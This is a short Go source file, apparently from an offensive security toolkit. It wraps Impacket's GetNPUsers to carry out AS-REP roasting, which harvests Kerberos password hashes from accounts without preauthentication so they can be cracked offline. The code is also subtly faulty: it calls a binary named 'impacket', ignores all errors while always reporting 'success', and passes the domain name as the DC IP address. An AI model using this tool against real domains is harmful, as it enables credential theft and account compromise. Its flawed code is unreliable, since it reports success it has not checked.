package kerberos

import "os/exec"

type ASREPRoastResult struct {
	User   string
	Status string
	Hash   string
}

type ASREPRoast struct {
	Domain string
	User   string
}

func (a ASREPRoast) Roast() ASREPRoastResult {
	cmd := exec.Command("impacket", "GetNPUsers", a.Domain+"/"+a.User, "-no-pass", "-request")
	out, _ := cmd.Output()
	return ASREPRoastResult{User: a.User, Status: "success", Hash: string(out)}
}

func (a ASREPRoast) RoastWithDomain() ASREPRoastResult {
	cmd := exec.Command("impacket", "GetNPUsers", a.Domain+"/"+a.User, "-no-pass", "-request", "-dc-ip", a.Domain)
	out, _ := cmd.Output()
	return ASREPRoastResult{User: a.User, Status: "success", Hash: string(out)}
}
